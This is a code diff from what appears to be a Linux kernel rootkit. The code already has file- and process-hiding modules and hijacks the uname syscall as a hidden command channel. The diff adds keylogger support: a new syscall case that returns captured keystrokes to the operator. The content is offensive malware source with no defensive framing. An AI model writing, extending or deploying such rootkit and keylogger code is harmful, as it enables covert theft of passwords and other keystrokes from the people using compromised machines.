@@ -11,6 +11,7 @@
 #include <anima/debug.h>
 #include <anima/hide_file.h>
 #include <anima/hide_task.h>
+#include <anima/keylogger.h>
 #include <anima/ksyms.h>
 #include <anima/libc.h>
 #include <anima/uaccess.h>
@@ -600,6 +601,9 @@ asmlinkage long new_sys_newuname(struct new_utsname *name)
 		break;
 	case SYSCALL_UNREDIRECT_EXECVE:
 		unredirect_path(args.p_param1, args.param2, REDIRECT_PATH_EXECVE);
+		break;
+	case SYSCALL_GET_KEYLOGGER_BUF:
+		keylogger_buffer_get(args.p_param1, args.param2);
 		break;
 #ifdef DEBUG
 	case DEBUG_RK:
